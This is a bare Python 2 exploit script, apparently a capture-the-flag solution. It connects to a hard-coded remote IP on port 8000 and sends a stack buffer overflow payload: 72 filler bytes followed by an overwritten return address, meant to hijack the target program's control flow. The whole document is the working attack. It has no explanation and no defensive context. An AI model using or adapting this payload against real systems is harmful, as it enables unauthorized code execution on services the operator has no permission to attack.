#!/usr/bin/env python

import socket

TCP_IP = '216.165.2.35'
TCP_PORT = 8000
BUFFER_SIZE = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

data = s.recv(BUFFER_SIZE)
print data
s.send('A'*72+'\x0d\x06\x40\x00\x00\x00\x00\x00'+"\r\n")
data = s.recv(BUFFER_SIZE)
print data